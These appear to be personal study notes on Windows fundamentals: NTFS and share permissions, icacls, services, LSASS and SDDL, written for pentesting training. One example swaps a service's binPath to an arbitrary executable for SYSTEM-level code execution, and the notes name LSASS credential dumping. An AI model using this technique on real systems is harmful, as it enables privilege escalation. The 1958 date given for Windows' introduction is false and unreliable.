

### The Windows OS

Microsoft first introduced Windows OS on November 20,1958. The first windows OS was a graphical OS shell for MS-DOS. Later versions introduced Win fileManager , Program Manager and Print Manager programs.

Windows 95 was first full integration of Windows and DOS and offered built in Internet support for first time.The version also debuted the Internet Explorer. Since initial version it progressed and released dozen versions such as Windows XP, Vista , 8 ,10 and currently 11. overtime , Microsoft started releasing editions of each windows desktop to everyone from casual customer to enterprise customers.

Windows Server was first released in 1993 with the release of Windows NT 3.1 Advanced Server. Windows NT saw several updates over the years, adding in technologies such as Internet Information Services (IIS), various networking protocols, Administrative Wizards to facilitate admin tasks, and more. <mark style="background: #FF5582A6;"><mark style="background: #FFF3A3A6;">With the release of Windows 2000, Microsoft debuted Active Directory, originally intended to help sysadmins set up file sharing, data encryption, VPNs, etc. Windows Server 2000 also included the Microsoft Management Console (MMC) and supported dynamic disk volumes.
</mark></mark>

Windows Server 2003 came next with server roles, a built-in firewall, the Volume Shadow Copy Service, and more. Windows Server 2008 included failover clustering, Hyper-V virtualization software, Server Core, Event Viewer, and major enhancements to Active Directory. Over the years, Microsoft released further Server versions, including Server 2012, Server 2016, and most recently, Server 2019. This latest version added support for Kubernetes, Linux containers, and more advanced security features.

As new versions of Windows are introduced, older versions are deprecated and no longer receive Microsoft updates (unless a long-term support contract is purchased in some cases). Windows Server 2008 and 2012 reached end of life for security updates on January 14, 2020. Currently, only Server 2012 R2 and later are in support. However, Microsoft has released out-of-band patches for earlier versions of Windows in the past few years due to the discovery of the critical SMBv1 vulnerability (EternalBlue).


#### Windows Versions

The following is a list of the major Windows operating systems and associated version numbers:

|Operating System Names|Version Number|
|---|---|
|Windows NT 4|4.0|
|Windows 2000|5.0|
|Windows XP|5.1|
|Windows Server 2003, 2003 R2|5.2|
|Windows Vista, Server 2008|6.0|
|Windows 7, Server 2008 R2|6.1|
|Windows 8, Server 2012|6.2|
|Windows 8.1, Server 2012 R2|6.3|
|Windows 10, Server 2016, Server 2019|10.0|
We can use the [Get-WmiObject](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1) [cmdlet](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7) to find information about the operating system. This cmdlet can be used to get instances of WMI classes or information about available WMI classes. There are a variety of ways to find the version and build number of our system. We can easily obtain this information using the `win32_OperatingSystem` class, which shows 

![[Pasted image 20250423234326.png]]

#### Local Access Concepts
Local access is the most common way to access any computer, including computers running Windows. `Input` is likely happening through a keyboard, trackpad &/or mouse. `Output` is coming from the display screen(s).

#### Remote Access Concepts

Remote Access is accessing a computer over a network. Local access to a computer is needed before one can access another computer remotely. There are countless methods for remote access.

Consider [MSPs](https://www.techtarget.com/searchitchannel/definition/managed-service-provider) & [MSSPs](https://www.gartner.com/en/information-technology/glossary/mssp-managed-security-service-provider), both industries are primarily dependent on managing their client's computer systems remotely. This functionality allows them to centralize management, standardize what technologies are used, automate numerous tasks, enable remote work arrangements and allow for quick response time when issues surface, or potential security threats emerge. Remote access is not just limited to MSPs & MSSPs.

Organizations with IT, Software Development &/or Security teams use remote access methods daily to build applications, manage servers and administer employee workstations. Some of the most common remote access technologies include but aren't limited to:

- Virtual Private Networks (VPN)
- Secure Shell (SSH)
- File Transfer Protocol (FTP)
- Virtual Network Computing (VNC)
- Windows Remote Management (or PowerShell Remoting) (WinRM)
- Remote Desktop Protocol (RDP)

#### Remote Desktop Protocol (RDP)

RDP uses a client/server architecture where a client-side application is used to specify a computer's target IP address or hostname over a network where RDP access is enabled. The target computer where RDP remote access is enabled is considered the server. It is important to note that RDP listens by default on logical port `3389`. Keep in mind that an IP address is used as a logical identifier for a computer on a network, and a logical port is an identifier assigned to an application. In simpler terms, we could consider a network subnet a street in a town (the corporate network), an IP address in that subnet assigned to a host as a house on that street, and logical ports as windows/doors that can be used to access the house.

We can use RDP to connect to a Windows target from an attack host running Linux or Windows. If we are connecting to a Windows target from a Windows host, we can use the built-in RDP client application called `Remote Desktop Connection` ([mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc))

For this to work, remote access must already be [allowed](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-allow-access) on the target Windows system. By default, remote access is not allowed on Windows operating systems.Remote Desktop Connection also allows us to save connection profiles. This is a common habit among IT admins because it makes connecting to remote systems more convenient.

As pentesters, we can benefit from looking for these saved Remote Desktop Files (`.rdp`) while on an engagement.

Many other Remote Desktop client applications exist, some of which are listed in this Microsoft article called [Remote Desktop clients](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/remote-desktop-clients). 

#### Using xfreerdp
From a Linux-based attack host we can use a tool called [xfreerdp](https://linux.die.net/man/1/xfreerdp) to remotely access Windows targets. You will notice that we use xfreerdp across multiple modules because of its ease of use, feature set, command line utility, and efficiency.

## Windows Operating System Structure

In windows OS the root directory is `<drive_letter:\>` .The root directory(also consist boot partition) is where OS is installed. Other physical and virtual drives are assigned other letters

|Directory|Function|
|---|---|
|Perflogs|Can hold Windows performance logs but is empty by default.|
|Program Files|On 32-bit systems, all 16-bit and 32-bit programs are installed here. On 64-bit systems, only 64-bit programs are installed here.|
|Program Files (x86)|32-bit and 16-bit programs are installed here on 64-bit editions of Windows.|
|ProgramData|This is a hidden folder that contains data that is essential for certain installed programs to run. This data is accessible by the program no matter what user is running it.|
|Users|This folder contains user profiles for each user that logs onto the system and contains the two folders Public and Default.|
|Default|This is the default user profile template for all created users. Whenever a new user is added to the system, their profile is based on the Default profile.|
|Public|This folder is intended for computer users to share files and is accessible to all users by default. This folder is shared over the network by default but requires a valid network account to access.|
|AppData|Per user application data and settings are stored in a hidden user subfolder (i.e., cliff.moore\AppData). Each of these folders contains three subfolders. The Roaming folder contains machine-independent data that should follow the user's profile, such as custom dictionaries. The Local folder is specific to the computer itself and is never synchronized across the network. LocalLow is similar to the Local folder, but it has a lower data integrity level. Therefore it can be used, for example, by a web browser set to protected or safe mode.|
|Windows|The majority of the files required for the Windows operating system are contained here.|
|System, System32, SysWOW64|Contains all DLLs required for the core features of Windows and the Windows API. The operating system searches these folders any time a program asks to load a DLL without specifying an absolute path.|
|WinSxS|The Windows Component Store contains a copy of all Windows components, updates, and service packs.|

## FileSystems

There are 5 types of Windows file systems: FAT12, FAT16, FAT32, NTFS, and exFAT. FAT12 and FAT16 are no longer used on modern Windows operating systems

FAT32 (File Allocation Table) is widely used across many types of storage devices such as USB memory sticks and SD cards but can also be used to format hard drives. The "32" in the name refers to the fact that FAT32 uses 32 bits of data for identifying data clusters on a storage device.

**`Pros of FAT32:`**

- Device compatibility - it can be used on computers, digital cameras, gaming consoles, smartphones, tablets, and more.
- Operating system cross-compatibility - It works on all Windows operating systems starting from Windows 95 and is also supported by MacOS and Linux.

**`Cons of FAT32:`**

- Can only be used with files that are less than 4GB.
- No built-in data protection or file compression features.
- Must use third-party tools for file encryption.

NTFS (New Technology File System) is the default Windows file system since Windows NT 3.1. In addition to making up for the shortcomings of FAT32, NTFS also has better support for metadata and better performance due to improved data structuring.

**`Pros of NTFS:`**

- NTFS is reliable and can restore the consistency of the file system in the event of a system failure or power loss.
- Provides security by allowing us to set granular permissions on both files and folders.
- Supports very large-sized partitions.
- Has journaling built-in, meaning that file modifications (addition, modification, deletion) are logged.

**`Cons of NTFS:`**

- Most mobile devices do not support NTFS natively.
- Older media devices such as TVs and digital cameras do not offer support for NTFS storage devices.

#### Permissions

The NTFS file system has many basic and advanced permissions. Some of the key permission types are:

|Permission Type|Description|
|---|---|
|Full Control|Allows reading, writing, changing, deleting of files/folders.|
|Modify|Allows reading, writing, and deleting of files/folders.|
|List Folder Contents|Allows for viewing and listing folders and subfolders as well as executing files. Folders only inherit this permission.|
|Read and Execute|Allows for viewing and listing files and subfolders as well as executing files. Files and folders inherit this permission.|
|Write|Allows for adding files to folders and subfolders and writing to a file.|
|Read|Allows for viewing and listing of folders and subfolders and viewing a file's contents.|
|Traverse Folder|This allows or denies the ability to move through folders to reach other files or folders. For example, a user may not have permission to list the directory contents or view files in the documents or web apps directory in this example c:\users\bsmith\documents\webapps\backups\backup_02042020.zip but with Traverse Folder permissions applied, they can access the backup archive.|

Files and folders inherit the NTFS permissions of their parent folder for ease of administration, so administrators do not need to explicitly set permissions for each file and folder, as this would be extremely time-consuming. If permissions do need to be set explicitly, an administrator can disable permissions inheritance for the necessary files and folders and then set the permissions directly on each.

#### Integrity Control Access Control List (icacls)

NTFS permissions on files and folders in Windows can be managed using the File Explorer GUI under the security tab. Apart from the GUI, we can also achieve a fine level of granularity over NTFS file permissions in Windows from the command line using the icacls utility.

We can list out the NTFS permissions on a specific directory by running either `icacls` from within the working directory or `icacls C:\Windows` against a directory not currently in.

```PowerShell
PS C:\Academy> icacls C:\Windows
C:\Windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Administrators:(M)
           BUILTIN\Administrators:(OI)(CI)(IO)(F)
           BUILTIN\Users:(RX)
           BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

The resource access level is listed after each user in the output. The possible inheritance settings are:

- `(CI)`: container inherit
- `(OI)`: object inherit
- `(IO)`: inherit only
- `(NP)`: do not propagate inherit
- `(I)`: permission inherited from parent container

In the above example, the `NT AUTHORITY\SYSTEM` account has object inherit, container inherit, inherit only, and full access permissions. This means that this account has full control over all file system objects in this directory and subdirectories.

Basic access permissions are as follows:

- `F` : full access
- `D` :  delete access
- `N` :  no access
- `M` :  modify access
- `RX` :  read and execute access
- `R` :  read-only access
- `W` :  write-only access

We can add and remove permissions via the command line using `icacls`.

Using the command `icacls c:\users /grant joe:f` we can grant the joe user full control over the directory, but given that `(oi)` and `(ci)` were not included in the command, the joe user will only have rights over the `c:\users` folder but not over the user subdirectories and files contained within them.

These permissions can be revoked using the command `icacls c:\users /remove joe`.

`icacls` is very powerful and can be used in a domain setting to give certain users or groups specific permissions over a file or folder, explicitly deny access, enable or disable inheritance permissions, and change directory/file ownership.

A full listing of `icacls` command-line arguments and detailed permission settings can be found [here](https://ss64.com/nt/icacls.html).

---

### NTFS vs. Share Permissions

Microsoft owns over [70%](https://gs.statcounter.com/os-market-share/desktop/worldwide/#monthly-201804-202104) of the global market share on desktop operating systems with Windows. This explains why most malware authors choose to write malware for Windows and why many perceive Windows as less secure than other operating systems. From a business perspective it just makes sense for malware authors to expend resources on writing malware for Windows. It is a high-value target. The idea that any OS is immune to malware is a technical fallacy. If software can be written for an operating system then a virus can be written for an operating system. Keep in mind that a virus, by definition, is software written with malicious intent and can be written for any OS.

Many variants of malware written for Windows can spread over the network via network shares with lenient permissions applied. It is also worth noting that to this day, the infamous `EternalBlue` vulnerability still haunts unpatched Windows systems running `SMBv1` and often paves the way for ransomware to shut down organisations.

The `Server Message Block protocol` (`SMB`) is used in Windows to connect shared resources like files and printers. It is used in large, medium, and small enterprise environments. See the image below to visualize this concept:
![[Pasted image 20250424010708.png]]

<mark style="background: #FF5582A6;">NTFS permissions and share permissions are often understood to be the same. Please know that they are not the same but often apply to the same shared resource.</mark> Let’s take a look at the individual permissions that can be set to secure/grant objects access to a network share hosted on a Windows OS running the NTFS file system.

#### Share permissions

|Permission|Description|
|---|---|
|`Full Control`|Users are permitted to perform all actions given by Change and Read permissions as well as change permissions for NTFS files and subfolders|
|`Change`|Users are permitted to read, edit, delete and add files and subfolders|
|`Read`|Users are allowed to view file & subfolder contents|

#### NTFS Basic permissions

| Permission             | Description                                                                                                                         |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| `Full Control`         | Users are permitted to add, edit, move, delete files & folders as well as change NTFS permissions that apply to all allowed folders |
| `Modify`               | Users are permitted or denied permissions to view and modify files and folders. This includes adding or deleting files              |
| `Read & Execute`       | Users are permitted or denied permissions to read the contents of files and execute programs                                        |
| `List folder contents` | Users are permitted or denied permissions to view a listing of files and subfolders                                                 |
| `Read`                 | Users are permitted or denied permissions to read the contents of files                                                             |
| `Write`                | Users are permitted or denied permissions to write changes to a file and add new files to a folder                                  |
| `Special Permissions`  | A variety of advanced permissions options                                                                                           |

#### NTFS special permissions

| Permission                       | Description                                                                                                                                                                                                                                  |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Full control`                   | Users are permitted or denied permissions to add, edit, move, delete files & folders as well as change NTFS permissions that apply to all permitted folders                                                                                  |
| `Traverse folder / execute file` | Users are permitted or denied permissions to access a subfolder within a directory structure even if the user is denied access to contents at the parent folder level. Users may also be permitted or denied permissions to execute programs |
| `List folder/read data`          | Users are permitted or denied permissions to view files and folders contained in the parent folder. Users can also be permitted to open and view files                                                                                       |
| `Read attributes`                | Users are permitted or denied permissions to view basic attributes of a file or folder. Examples of basic attributes: system, archive, read-only, and hidden                                                                                 |
| `Read extended attributes`       | Users are permitted or denied permissions to view extended attributes of a file or folder. Attributes differ depending on the program                                                                                                        |
| `Create files/write data`        | Users are permitted or denied permissions to create files within a folder and make changes to a file                                                                                                                                         |
| `Create folders/append data`     | Users are permitted or denied permissions to create subfolders within a folder. Data can be added to files but pre-existing content cannot be overwritten                                                                                    |
| `Write attributes`               | Users are permitted or denied to change file attributes. This permission does not grant access to creating files or folders                                                                                                                  |
| `Write extended attributes`      | Users are permitted or denied permissions to change extended attributes on a file or folder. Attributes differ depending on the program                                                                                                      |
| `Delete subfolders and files`    | Users are permitted or denied permissions to delete subfolders and files. Parent folders will not be deleted                                                                                                                                 |
| `Delete`                         | Users are permitted or denied permissions to delete parent folders, subfolders and files.                                                                                                                                                    |
| `Read permissions`               | Users are permitted or denied permissions to read permissions of a folder                                                                                                                                                                    |
| `Change permissions`             | Users are permitted or denied permissions to change permissions of a file or folder                                                                                                                                                          |
| `Take ownership`                 | Users are permitted or denied permission to take ownership of a file or folder. The owner of a file has full permissions to change any permissions                                                                                           |

### **Shared Resource Permissions in Windows (Brief)**

- **Shared resources** (like folders) in Windows use two types of permissions:
    - **NTFS Permissions** (file system level)
    - **SMB/Share Permissions** (network-level)
        
- Both **NTFS** and **SMB permissions** apply **together** when a folder is shared.

- Access control is handled using an **Access Control List (ACL)**.
    
- The **ACL** contains **Access Control Entries (ACEs)**.
    
- Each **ACE** defines what level of access a **security principal** (user or group) has.
    
- Using **groups** (instead of individual users) makes access control easier to manage and audit.



### 🛡️ **Windows Firewall, SMB, and Authentication – Quick Notes**

- **SMB Access & Firewall**:  
    Windows Defender Firewall may block SMB connections from systems outside the same **workgroup** or **network** (e.g., Linux machines on HTB VPN).
    
- **Workgroup vs. Domain Authentication**:
    - **Workgroup**: Authenticates against the **local SAM database**.
    - **Domain**: Authenticates via **Active Directory (AD)** — a centralized database.
        
- **Important When Connecting**: Understand **where the user account (e.g., `htb-student`) is hosted** — local system (SAM) or AD — to choose proper authentication.
    
- **Firewall Testing Tips**:
    
    - Disable firewall profiles temporarily to test access.
    - Alternatively, enable predefined rules:
        - **"File and Printer Sharing (SMB-In)"** rules in **Advanced Firewall settings**.
            
- **Firewall Behavior**: Controls both **inbound** and **outbound** traffic. Inbound SMB is commonly blocked by default on public networks.



The different inbound and outbound rules are associated with the different firewall profiles in defender.

Windows Defender Firewall Profiles:

- `Public`
- `Private`
- `Domain`


In the Windows world, the `C:\ drive` is the parent directory to rule all directories unless a system administrator were to disable inheritance inside a newly created folder’s advanced Security settings.

`Event Viewer` is another good place to investigate actions completed on Windows. Almost every operating system has a logging mechanism and a utility to view the logs that were captured. Know that a log is like a journal entry for a computer, where the computer writes down all the actions that were performed and numerous details associated with that action.

### Windows Services & Processes

Applications can also be created to install as a service, such as a network monitoring application installed on a server. Services on Windows are responsible for many functions within the Windows operating system, such as networking functions, performing system diagnostics, managing user credentials, controlling Windows updates, and more.

Windows services are managed via the Service Control Manager (SCM) system, accessible via the `services.msc` MMC add-in.

### Windows Services Overview

- **Service Statuses**:
    - `Running`, `Stopped`, `Paused`
    - Transitional states: `Starting`, `Stopping`
        
- **Startup Types**:
    - `Manual`, `Automatic`, `Automatic (Delayed Start)`
        
- **Service Categories**:

    - `Local Services`
    - `Network Services`
    - `System Services`
        
- **Access Control**:
    - Only users with **administrative privileges** can create, modify, or delete services.
        
- **Security Note**:
    - **Misconfigured service permissions** are a common **privilege escalation** path on Windows systems.

In Windows, we have some [critical system services](https://docs.microsoft.com/en-us/windows/win32/rstmgr/critical-system-services) that cannot be stopped and restarted without a system restart. If we update any file or resource in use by one of these services, we must restart the system.

|Service|Description|
|---|---|
|smss.exe|Session Manager SubSystem. Responsible for handling sessions on the system.|
|csrss.exe|Client Server Runtime Process. The user-mode portion of the Windows subsystem.|
|wininit.exe|Starts the Wininit file .ini file that lists all of the changes to be made to Windows when the computer is restarted after installing a program.|
|logonui.exe|Used for facilitating user login into a PC|
|lsass.exe|The Local Security Authentication Server verifies the validity of user logons to a PC or server. It generates the process responsible for authenticating users for the Winlogon service.|
|services.exe|Manages the operation of starting and stopping services.|
|winlogon.exe|Responsible for handling the secure attention sequence, loading a user profile on logon, and locking the computer when a screensaver is running.|
|System|A background system process that runs the Windows kernel.|
|svchost.exe with RPCSS|Manages system services that run from dynamic-link libraries (files with the extension .dll) such as "Automatic Updates," "Windows Firewall," and "Plug and Play." Uses the Remote Procedure Call (RPC) Service (RPCSS).|
|svchost.exe with Dcom/PnP|Manages system services that run from dynamic-link libraries (files with the extension .dll) such as "Automatic Updates," "Windows Firewall," and "Plug and Play." Uses the Distributed Component Object Model (DCOM) and Plug and Play (PnP) services.|

This [link](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_components#Services) has a list of Windows components, including key services.

#### Processes

Critical vs Non-Critical Windows Processes
- **Non-critical processes** (often from user-installed applications) can typically be terminated without major system impact.
- **Critical system processes** should _never_ be terminated — doing so may cause OS instability or a crash.
    
#### 🛑 Examples of **critical Windows processes**:

- `winlogon.exe` – Windows Logon Application
- `System` – Kernel and driver management
- `System Idle Process` – CPU usage placeholder
- `wininit.exe` – Windows Start-Up Application
- `csrss.exe` – Client Server Runtime
- `smss.exe` – Session Manager
- `svchost.exe` – Service Host
- `lsass.exe` – Local Security Authority Subsystem Service
    

### Local Security Authority Subsystem Service (LSASS)
`lsass.exe` is the process that is responsible for enforcing the security policy on Windows systems. When a user attempts to log on to the system, this process verifies their log on attempt and creates access tokens based on the user's permission levels
- **Role:** Enforces the **security policy** on Windows systems.
- **Key Functions:**
    - Verifies **logon attempts**
    - Generates **access tokens** based on user privileges
    - Handles **password changes**
    - Logs security-related events (logon/logoff) in the **Windows Security Log**
        

Why it’s a High-Value Target:
- Stores **credentials** (cleartext & hashes) in memory.
- Tools like **Mimikatz** can extract this sensitive data.
- Attackers often target LSASS for **lateral movement** and **privilege escalation**.
    
 Always monitor and restrict access to LSASS memory to prevent credential theft.

### Sysinternals Tools Suite

- A collection of **portable Windows utilities** for advanced system administration and troubleshooting.
- Developed by **Microsoft**, designed to run without requiring installation.

#### How to Use
- **Download directly** from Microsoft:  
    [https://learn.microsoft.com/sysinternals](https://learn.microsoft.com/sysinternals)
- **Access live over the internet:**  
    Type `\\live.sysinternals.com\tools` in **Windows Explorer** to browse and run tools remotely.
    

#### Notable Tools:
- `Process Explorer` – Advanced Task Manager
- `Autoruns` – Startup program viewer
- `PsExec` – Remote process execution via the SMB protocol remotely
- `Procmon` – Real-time file and registry monitoring
- `TCPView` – Network connections viewer

#### Task Manager - Windows
Windows Task Manager is a powerful utility used for managing and monitoring various aspects of a Windows system. It provides detailed information and control over the following components:

- **Running Processes**: View and manage active processes.
- **System Performance**: CPU, memory, disk, and network usage statistics.
- **Running Services**: Start, stop, and monitor system services.
- **Startup Programs**: Manage which programs launch at system startup.
- **Logged-In Users**: See currently logged-in users and their active sessions.

| Tab             | Description                                                                                                                                                                                                                                                      |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Processes tab   | Shows a list of running applications and background processes along with the CPU, memory, disk, network, and power usage for each.                                                                                                                               |
| Performance tab | Shows graphs and data such as CPU utilization, system uptime, memory usage, disk and, networking, and GPU usage. We can also open the `Resource Monitor`, which gives us a much more in-depth view of the current CPU, Memory, Disk, and Network resource usage. |
| App history tab | Shows resource usage for the current user account for each application for a period of time.                                                                                                                                                                     |
| Startup tab     | Shows which applications are configured to start at boot as well as the impact on the startup process.                                                                                                                                                           |
| Users tab       | Shows logged in users and the processes/resource usage associated with their session.                                                                                                                                                                            |
| Details tab     | Shows the name, process ID (PID), status, associated username, CPU, and memory usage for each running application.                                                                                                                                               |
| Services tab    | Shows the name, PID, description, and status of each installed service. The Services add-in can be accessed from this tab as well.                                                                                                                               |

#### Process Explorer

Process Explorer is a powerful tool from the Sysinternals suite that provides in-depth information about the processes running on a Windows system. It offers detailed insights into the following:

- **Handles and DLLs**: View which handles and Dynamic Link Libraries (DLLs) are loaded when a process runs.
- **Running Processes**: See a list of all active processes with details on their respective handles, loaded DLLs, and memory-swapped files.
- **Search Functionality**: Search within the tool to identify processes tied to a specific handle or DLL.
- **Parent-Child Process Relationships**: Analyze the relationships between parent and child processes, helping to identify orphaned processes or troubleshoot process-related issues.
- **Process Management**: Identify and manage processes by monitoring resource consumption and dependencies.

### Service Permissions
Windows Service Permissions & Threat Vectors
- Windows services are long-running processes that can be abused if misconfigured.
- Service misconfigurations can allow:
    - Loading of malicious DLLs
    - Privilege escalation
    - Non-admin execution of applications
    - Persistence
        
#### Common Issues:
- Often caused by:
    - Third-party software installs
    - Administrator errors during service setup
        
- Services run under the current user's context by default unless otherwise specified.

#### Real-World Example (Bob):

- Suppose Bob is logged into a server and installs DHCP without changing the default service account.
- DHCP will then run under Bob’s account.
- If Bob leaves the company and his account is disabled, DHCP will fail to start.
- This can lead to:
    - No IP leases to network clients
    - Downtime and productivity loss

Best Practice: Always use dedicated service accounts for critical services like DHCP, Active Directory Domain Services, etc.

#### Security Tips:
- Review service permissions regularly
- Inspect permissions of executable directories
- Misconfigured paths can allow attackers to drop malicious executables or DLLs


#### Examining Services using services.msc

### Accessing Services

- Use `services.msc` to view and manage service details.
- Important for identifying misconfigurations and security issues.

### Key Properties to Note
- **Service Name**: Useful for CLI tools like `sc.exe`, `Get-Service`, etc.
- **Display Name**: Friendly name shown in the GUI.
- **Status**: Running, Stopped, Paused, etc.
- **Startup Type**: Manual, Automatic, Delayed, Disabled.
- **Path to Executable**: Full command used to start the service.
    
    - ⚠ If NTFS permissions on this path are weak, attackers could **replace the executable** with malicious code.

### Service Privileges

- Most services run under the **LocalSystem** account by default.
    - This is the **highest level of privilege** on a local system.

- Not all applications need this level of access.
    - Prefer to run services with **least privileges** whenever possible.

### Built-in Windows Service Accounts

- `LocalService` – Limited privileges; useful for services that don't require high-level access.
- `NetworkService` – Similar to LocalService but with network access using the machine's credentials.
- `LocalSystem` – Full access to the system (used by many core services).

> We can also **create custom service accounts** for specific services to improve security.

### Principle of Least Privilege

- A fundamental concept in security: **only grant the minimal permissions necessary** for a task.
- Helps reduce the attack surface of the system.
[More on the Principle of Least Privilege – Cloudflare](https://www.cloudflare.com/learning/access-management/principle-of-least-privilege/)

The recovery tab allows steps to be configured should a service fail.
### Available Actions
- Restart the service.
- Run a specific program.
- Restart the computer.

### Security Risk
- **Running a program on failure** can be **exploited by attackers**.
    - If they can configure the recovery settings, they can **execute malicious code** under the context of the service.
    - Especially dangerous if the service runs under a **privileged account** like `LocalSystem`

> **Best Practice**: Restrict who can modify service configurations and monitor recovery settings for anomalies.


### Examining services using sc

#### Using `sc` to Manage Services

### 1. **Querying Services**
- The `sc qc` command is used to **query configuration details** of a service.    
```Cmd
sc qc ServiceName
```

    
- Syntax (remote):
```Cmd
sc \\<hostname or IP> query ServiceName
```
### 2. **Starting and Stopping Services**

- To stop a service:
```Cmd
    `sc stop ServiceName`
```

- Requires **elevated privileges** (run CMD as administrator).
    - If not, you'll get:
        `[SC] OpenService FAILED 5: Access is denied.`

### 3. **Modifying Service Executables**
- You can change the executable path of a service:

```
sc config wuauserv binPath= "C:\Winbows\Perfectlylegitprogram.exe"`
```

- This shows:

```
[SC] ChangeServiceConfig SUCCESS`
```

- To verify the change:
```Cmd
sc qc wuauserv
```    

 **Output:
```Cmd
BINARY_PATH_NAME : C:\Winbows\Perfectlylegitprogram.exe`
```   

### ⚠️ Security Implication
- If an attacker can modify the `binPath` of a service running as `LocalSystem`, they can **execute arbitrary code with SYSTEM-level privileges**.
- Always validate permissions on service configurations and executables.


#### Investigating Services with `sc` and Understanding SDDL

### Why Use `sc` for Investigations?

- `sc` (Service Control) is a **command-line utility** used to query, start, stop, and configure Windows services.
- It’s **script-friendly** and quicker for automation or remote work compared to GUI tools like `services.msc`.
- Useful for investigating **malware-related activity**, especially **new or misconfigured services**.

#### Viewing Service Permissions with `sdshow`


```Cmd
sc sdshow <ServiceName>
```
Example:


```Cmd
sc sdshow wuauserv
D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(AU;FA;CCDCLCSWRPWPDTLOSDRCWDWO;;;WD)
```

### What This Means

The output is in **Security Descriptor Definition Language (SDDL)** format.
`D: (A;;CCLCSWRPLORC;;;AU)`

1. D: - the proceeding characters are DACL permissions
2. AU: - defines the security principal Authenticated Users
3. A;; - access is allowed
4. CC - SERVICE_QUERY_CONFIG is the full name, and it is a query to the service control manager (SCM) for the service configuration
5. LC - SERVICE_QUERY_STATUS is the full name, and it is a query to the service control manager (SCM) for the current status of the service
6. SW - SERVICE_ENUMERATE_DEPENDENTS is the full name, and it will enumerate a list of dependent services
7. RP - SERVICE_START is the full name, and it will start the service
8. LO - SERVICE_INTERROGATE is the full name, and it will query the service for its current status
9. RC - READ_CONTROL is the full name, and it will query the security descriptor of the service

- `D:` → Indicates this is the **Discretionary Access Control List (DACL)**.
    
- Each `(...)` set is an **Access Control Entry (ACE)**.
    

---

### Breakdown of One ACE

Example ACE:
`(A;;CCLCSWRPLORC;;;AU)`

|Component|Meaning|
|---|---|
|`A`|Allow (can also be `D` for Deny)|
|`;;`|Placeholder for unused flags|
|`CCLCSWRPLORC`|Permissions granted|
|`;;;AU`|Security principal: **Authenticated Users**|

### Permission Codes

|Code|Full Permission Name|
|---|---|
|`CC`|`SERVICE_QUERY_CONFIG` – View service config|
|`LC`|`SERVICE_QUERY_STATUS` – View current status|
|`SW`|`SERVICE_ENUMERATE_DEPENDENTS` – View dependents|
|`RP`|`SERVICE_START` – Start service|
|`LO`|`SERVICE_INTERROGATE` – Query service status|
|`RC`|`READ_CONTROL` – View security descriptor|

---

### Summary

- **SDDL** allows for deep inspection of **who has what access** to a service.
    
- **Each ACE** defines permissions for a user/group (security principal).
    
- Misconfigured service permissions can be used to gain unauthorized access or persist on a system.


#### Examining Service Permissions with PowerShell

PowerShell offers a powerful way to inspect and manage service permissions, especially when dealing with large environments or scripting needs.

#### `Get-Acl` Command

We can examine the access control list (ACL) of a service by querying its registry key:

```Cmd
Get-Acl -Path HKLM:\System\CurrentControlSet\Services\<ServiceName> | Format-List
```

```powershell
Get-Acl -Path HKLM:\System\CurrentControlSet\Services\wuauserv | Format-List
```

#### Output Breakdown
```powershell-session
PS C:\Users\htb-student> Get-ACL -Path HKLM:\System\CurrentControlSet\Services\wuauserv | Format-List

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\wuauserv
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  ReadKey
         BUILTIN\Users Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         -2147483648
Audit  :
Sddl   : O:SYG:SYD:AI(A;ID;KR;;;BU)(A;CIIOID;GR;;;BU)(A;ID;KA;;;BA)(A;CIIOID;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A
         ;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654
         721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S-1-15-3-1024-1065365936-1281604716-351173842
         8-1654721687-432734479-3232135806-4053264122-3456934681)
```

| Field           | Description                                                                                       |
| --------------- | ------------------------------------------------------------------------------------------------- |
| **Path**        | Full registry path of the service                                                                 |
| **Owner**       | The user/group that owns the service                                                              |
